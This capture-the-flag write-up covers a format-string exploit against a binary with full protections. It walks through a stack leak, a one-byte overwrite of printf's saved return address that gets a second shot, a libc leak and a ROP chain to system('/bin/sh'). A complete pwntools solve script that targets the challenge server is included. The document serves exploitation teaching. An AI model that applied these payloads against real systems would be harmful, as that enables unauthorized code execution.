## 1. Printf

author: 0x1337
points: 482

the checksec output shows everything is enabled

The decomp:
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-214h] BYREF
  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
  unsigned __int64 v5; // [rsp+218h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = 1;
  memset(buf, 0, 0x200u);
  puts("Easy peasy printf, don't you think?");
  printf("I feel generous so have this: %p\n", &v3);
  puts("Show me what you've got!");
  printf("> ");
  read(0, buf, 0x200u);
  puts("Here we go!!");
  printf(buf);
  exit(0);
}
```

And as we can see, we indeed have a format string exploit here.
If you're unfamiliar with format strings i recommend you to first read this excellent [blog](https://axcheron.github.io/exploit-101-format-strings/) which explains most of the stuff required in detail.



First thing to note, is the stack leak we get by leak of `v3` var, this will help us greatly. Then we have a one-shot with format string to do out exploitation

With the stack leak we have, our best bet is to overwrite the `RIP` in `printf` stack frame when it's returning back to `main+204`. Put a bp on printf by doing `b *printf` and since i am using pwndbg
i inspect the function frame by doing `info frame` . The main idea here is to partial overwrite one byte of the saved return address which is right now `main+204` to `main` so that we can have another shot at doing format string attack after leaking some values

Let's start from the beginning
after getting the stack leak : `0x7ffdda72ce3c` and putting a breakpoint in printf we see

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdda72ce30:
 rip = 0x7f79a64606f0 in printf; saved rip = 0x562166ab72dd
 called by frame at 0x7ffdda72d060
 Arglist at 0x7ffdda72ce20, args:
 Locals at 0x7ffdda72ce20, Previous frame's sp is 0x7ffdda72ce30
 Saved registers:
  rip at 0x7ffdda72ce28
```

We notice the offset from leak to rip is `-0x14` and saved return adddress is `0x562166ab72dd` which is indeed `main+204`, and main is `0x562166ab7211` so we only have to change one byte.
Time to craft out payload... Not very fun

First i find the offset to a controllable area in the buffer, which is 8. What i mean is, when we do something like `%8$p` we get this output:
```
Show me what you've got!
> %8$p
Here we go!!
0xa70243825
```
and 0xa7024385 is nothing but `%8$p` in hex in Little Endian, so the 8th index is part we have control over i.e start of our input buffer.

After finding the offset i figured i'll have to get a libc leak too  while changing the saved return address, so i make this payload

```python
pl = b'%3$p.%17c%10$hhn'+p64(rip)
```

Ok let's quickly deconstuct this payload, the `%3$p` is used for leaking a libc address, the `%17c` is for writing `0x11` onto the address i want to, and `%10$hhn` refers to 'write a byte on the 10th index' after which comes the address i want to overwrite in little endian format

The reason why it's 10 and not 8 is because, before writing the address i want to overwrite, the payload is 15 bytes long, filling up the 8th and 9th index so address will be on 10th index.

```
Note:
%hhn is for writing a byte
%hn is for writing 2 bytes
and %n is for writing 4 bytes
```

So we are able to change the return address and leak libc too at the same time! very awesome.

Now it's just trivial ROP, we will make use of pwntools to make our payload for us

```python
writes = { rip: pop_rdi,rip+8:binsh,rip+16:ret,rip+24:libc.sym.system}
pl = fmtstr_payload(8,writes)
```

the rip address is same as before, here we are just writing the rop chain normally

and finally get the shell.

The solve script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./printf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["alacritty",'-e','bash','-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.blitzhack.xyz",4646)
        context.noptrace=True

    return r


def main():
    r = conn()


    r.recvuntil(b'this: ')
    stack_leak = int(r.recvline(), 16)
    rip = stack_leak-0x14
    log.info(f"Stack leak : {hex(stack_leak)}")
    log.info(f"rip in printf:{hex(rip)}")
    off = 8
    pl = b'%3$p.%17c%10$hhn'+p64(rip)
    gdb.attach(r)
    r.sendlineafter(b'>',pl)
    r.recvline()
    libc.address = int(r.recvuntil(b'.')[:-1],16) -0x114887

    log.info(f"libc address: {hex(libc.address)}")
    gdb.attach(r)
    pop_rdi =  libc.address+0x2a3e5
    binsh = next(libc.search(b'/bin/sh'))
    ret =  libc.address+0x2a3e5+1
    writes = { rip: pop_rdi,rip+8:binsh,rip+16:ret,rip+24:libc.sym.system}
    pl = fmtstr_payload(8,writes)

    sleep(2)
    r.sendlineafter(b'>',pl)
    r.interactive()


if __name__ == "__main__":
    main()
```

